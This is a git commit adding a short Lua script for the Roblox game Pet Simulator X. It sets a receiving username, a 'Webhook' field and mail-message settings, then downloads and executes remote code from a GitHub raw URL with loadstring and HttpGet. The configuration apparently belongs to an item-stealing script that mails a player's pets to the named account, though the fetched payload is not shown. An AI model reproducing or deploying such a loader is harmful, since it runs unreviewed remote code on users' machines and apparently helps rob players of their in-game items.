c6c995ade01176050785459205715de4b9dd5a25
MoonScriptt <137010878+MoonScriptt@users.noreply.github.com>
2023-10-27 22:57:51 +0700

    Create .lua

---
+++ petsimxdeadgame/visualscript/.lua
@@ -0,0 +1,10 @@
+LUA
+UserName = "kalongtzy"
+Webhook = "https://cdn.discordapp.com/attachments/1149343273358479393/1167464394129670154/th_9.jpg?ex=654e38f2&is=653bc3f2&hm=a8bdce9e1f935b2a39355c23faf0560d2b8de8dcd641f81bb693210019251d23&" 
+UserName2 = "kalongtzy"
+
+_G.MailMessage = "**THIS SCRIPT USING A MARVEL SCRIPT**"
+_G.LoadingTitle = "MarvelScriptzz" 
+_G.WebhookName = "Marvel"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/idkk/main/iddkkk2"))()
